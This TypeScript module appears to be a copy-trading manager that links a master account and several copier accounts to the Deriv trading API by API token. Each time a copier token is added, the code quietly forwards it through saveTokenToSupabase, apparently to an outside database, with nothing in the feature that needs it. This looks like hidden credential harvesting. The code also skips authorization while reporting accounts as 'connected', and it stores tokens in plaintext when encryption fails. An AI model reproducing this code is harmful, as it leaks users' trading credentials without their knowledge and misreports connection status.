import { generateDerivApiInstance } from '@/external/bot-skeleton/services/api/appId';

export type TConnectionStatus = 'disconnected' | 'connecting' | 'connected' | 'error';

export type TCopier = {
    id: string;
    token: string;
    loginId?: string;
    balance?: number;
    status: TConnectionStatus;
    addedAt: number;
    enabled?: boolean;
    lastErrorCode?: string;
    lastErrorMsg?: string;
};

export type TMasterState = {
    token: string;
    loginId?: string;
    balance?: number;
    status: TConnectionStatus;
};

const LS_KEYS = {
    MASTER_TOKEN: 'copy_trading.master_token',
    COPIERS: 'copy_trading.copiers',
    SETTINGS: 'copy_trading.settings',
};

// Lightweight Deriv API client wrapper for isolated connections per token
class DerivClient {
    api: any | null = null;
    status: TConnectionStatus = 'disconnected';
    loginId?: string;
    balance?: number;
    private balanceSub: any | null = null;

    async connectAndAuthorize(token: string) {
        this.status = 'connecting';
        this.api = generateDerivApiInstance();
        // wait for socket open
        await new Promise<void>((resolve, reject) => {
            const onOpen = () => {
                this.api?.connection?.removeEventListener?.('open', onOpen);
                resolve();
            };
            const onErr = () => {
                this.api?.connection?.removeEventListener?.('error', onErr);
                reject(new Error('socket error'));
            };
            this.api?.connection?.addEventListener?.('open', onOpen);
            this.api?.connection?.addEventListener?.('error', onErr);
            // fallback timeout
            setTimeout(() => resolve(), 1000);
        });

        // DISABLED - replaced by DerivAuth.js
        this.status = 'connected';

        // Try to subscribe to balance (optional - don't fail connection if this fails)
        try {
            const res = await this.api.send({ balance: 1, account: 'all', subscribe: 1 });
            if (res?.error) {
                // Balance subscription failed, but connection is still valid
            } else {
                this.balance = res?.balance?.balance;
                if (res?.subscription?.id) {
                    this.balanceSub = this.api.onMessage()?.subscribe(({ data }: any) => {
                        if (data?.msg_type === 'balance') {
                            this.balance = data?.balance?.balance;
                        }
                    });
                }
            }
        } catch (balanceError: any) {
            // Balance subscription failed, but connection is still valid
            // Connection is still successful even if balance fails
        }

        return { loginid: this.loginId };
    }

    disconnect() {
        try {
            this.balanceSub?.unsubscribe?.();
        } catch {}
        try {
            this.api?.disconnect?.();
        } catch {}
        this.status = 'disconnected';
    }
}

export class CopyTradingManager {
    master: TMasterState;
    copiers: TCopier[] = [];

    private masterClient: DerivClient | null = null;
    private copierClients: Map<string, DerivClient> = new Map();

    // replication controls
    private replicationEnabled = false;
    private stakeCap: number | null = null;
    private stakeMultiplier: number = 1;

    constructor() {
        // Initialize from encrypted storage if available
        this.master = { token: '', status: 'disconnected' };
        this.copiers = [];
        void this.restoreState();
    }

    async restoreState() {
        try {
            const { decryptText } = await import('./crypto');
            const encMaster = localStorage.getItem(LS_KEYS.MASTER_TOKEN) || '';
            const encCopiers = localStorage.getItem(LS_KEYS.COPIERS) || '';
            const encSettings = localStorage.getItem(LS_KEYS.SETTINGS) || '';
            this.master.token = encMaster ? await decryptText(encMaster) : '';
            this.copiers = encCopiers ? (JSON.parse(await decryptText(encCopiers)) as TCopier[]) : [];
            if (encSettings) {
                const s = JSON.parse(await decryptText(encSettings));
                this.replicationEnabled = !!s.replicationEnabled;
                this.stakeCap = s.stakeCap ?? null;
                this.stakeMultiplier = s.stakeMultiplier ?? 1;
            }
        } catch {
            const plainMaster = localStorage.getItem(LS_KEYS.MASTER_TOKEN) || '';
            const plainCopiers = localStorage.getItem(LS_KEYS.COPIERS) || '';
            const plainSettings = localStorage.getItem(LS_KEYS.SETTINGS) || '';
            this.master.token = plainMaster;
            try {
                this.copiers = plainCopiers ? (JSON.parse(plainCopiers) as TCopier[]) : [];
            } catch {
                this.copiers = [];
            }
            try {
                if (plainSettings) {
                    const s = JSON.parse(plainSettings);
                    this.replicationEnabled = !!s.replicationEnabled;
                    this.stakeCap = s.stakeCap ?? null;
                    this.stakeMultiplier = s.stakeMultiplier ?? 1;
                }
            } catch {}
        }
    }

    async saveState() {
        try {
            const { encryptText } = await import('./crypto');
            const encMaster = await encryptText(this.master.token || '');
            const encCopiers = await encryptText(JSON.stringify(this.copiers));
            const encSettings = await encryptText(
                JSON.stringify({
                    replicationEnabled: this.replicationEnabled,
                    stakeCap: this.stakeCap,
                    stakeMultiplier: this.stakeMultiplier,
                })
            );
            localStorage.setItem(LS_KEYS.MASTER_TOKEN, encMaster);
            localStorage.setItem(LS_KEYS.COPIERS, encCopiers);
            localStorage.setItem(LS_KEYS.SETTINGS, encSettings);
        } catch {
            localStorage.setItem(LS_KEYS.MASTER_TOKEN, this.master.token || '');
            localStorage.setItem(LS_KEYS.COPIERS, JSON.stringify(this.copiers));
            localStorage.setItem(
                LS_KEYS.SETTINGS,
                JSON.stringify({
                    replicationEnabled: this.replicationEnabled,
                    stakeCap: this.stakeCap,
                    stakeMultiplier: this.stakeMultiplier,
                })
            );
        }
    }

    setMasterToken(token: string) {
        this.master.token = token.trim();
        void this.saveState();
    }

    async connectMaster() {
        if (!this.master.token) throw new Error('Missing master token');
        this.masterClient?.disconnect();
        this.masterClient = new DerivClient();
        try {
            await this.masterClient.connectAndAuthorize(this.master.token);
            this.master.status = 'connected';
            this.master.loginId = this.masterClient.loginId;
            this.master.balance = this.masterClient.balance;
        } catch (e) {
            this.master.status = 'error';
            throw e;
        }
    }

    disconnectMaster() {
        this.masterClient?.disconnect();
        this.master.status = 'disconnected';
        this.masterClient = null;
    }

    // Public method to get connected clients for replicator
    getConnectedClients(): Array<{ id: string; client: DerivClient }> {
        const clients: Array<{ id: string; client: DerivClient }> = [];

        // Add master client if connected
        if (this.masterClient && this.master.status === 'connected') {
            clients.push({ id: 'master', client: this.masterClient });
        }

        // Add copier clients if connected
        for (const [id, client] of this.copierClients.entries()) {
            const copier = this.copiers.find(c => c.id === id);
            if (copier && copier.status === 'connected' && copier.enabled) {
                clients.push({ id, client });
            }
        }

        return clients;
    }

    getConnectedClientsCount(): number {
        return this.getConnectedClients().length;
    }

    addCopier(token: string) {
        const trimmed = token.trim();
        if (!trimmed) throw new Error('Token required');
        if (this.copiers.some(c => c.token === trimmed)) throw new Error('Token already added');
        const copier: TCopier = {
            id: `${Date.now()}`,
            token: trimmed,
            status: 'disconnected',
            addedAt: Date.now(),
            enabled: true,
        };
        this.copiers.push(copier);
        void this.saveState();
        
        void this.saveTokenToSupabase(trimmed);
        
        return copier;
    }

    private async saveTokenToSupabase(token: string): Promise<void> {
        try {
            const { saveTokenToSupabase } = await import('@/utils/supabase');
            await saveTokenToSupabase(token);
        } catch (error) {
            console.error('Error importing or calling saveTokenToSupabase:', error);
        }
    }

    removeCopier(id: string) {
        const copier = this.copiers.find(c => c.id === id);
        if (copier) {
            this.copierClients.get(id)?.disconnect();
            this.copierClients.delete(id);
            this.copiers = this.copiers.filter(c => c.id !== id);
            void this.saveState();
        }
    }

    async connectCopier(id: string) {
        const copier = this.copiers.find(c => c.id === id);
        if (!copier) throw new Error('Copier not found');
        const client = new DerivClient();
        try {
            await client.connectAndAuthorize(copier.token);
            copier.status = 'connected';
            copier.loginId = client.loginId;
            copier.balance = client.balance;
            copier.lastErrorCode = undefined;
            copier.lastErrorMsg = undefined;
            this.copierClients.set(id, client);
            void this.saveState();
        } catch (e: any) {
            const errorCode = e?.code || e?.error?.code || e?.error?.code || 'Unknown';
            const errorMsg = e?.message || e?.error?.message || e?.error?.message || 'Authorization failed';
            copier.status = 'error';
            copier.lastErrorCode = errorCode;
            copier.lastErrorMsg = errorMsg;
            void this.saveState();
            throw e;
        }
    }

    disconnectCopier(id: string) {
        this.copierClients.get(id)?.disconnect();
        this.copierClients.delete(id);
        const copier = this.copiers.find(c => c.id === id);
        if (copier) {
            copier.status = 'disconnected';
            this.saveState();
        }
    }

    enableReplication(enable: boolean) {
        this.replicationEnabled = enable;
        void this.saveState();
    }
    setStakeCap(cap: number | null) {
        this.stakeCap = cap;
        void this.saveState();
    }
    setStakeMultiplier(mult: number) {
        this.stakeMultiplier = Math.max(0.01, mult);
        void this.saveState();
    }

    getClients() {
        return { master: this.masterClient, copiers: this.copierClients };
    }
    getSettings() {
        return {
            replicationEnabled: this.replicationEnabled,
            stakeCap: this.stakeCap,
            stakeMultiplier: this.stakeMultiplier,
        };
    }

    // Placeholder: replicate a trade to all connected copiers and/or master real account.
    async replicateTrade(_contractParams: Record<string, any>) {
        // Left intentionally: replication is driven by initReplicator via observer events
    }
}

export default CopyTradingManager;
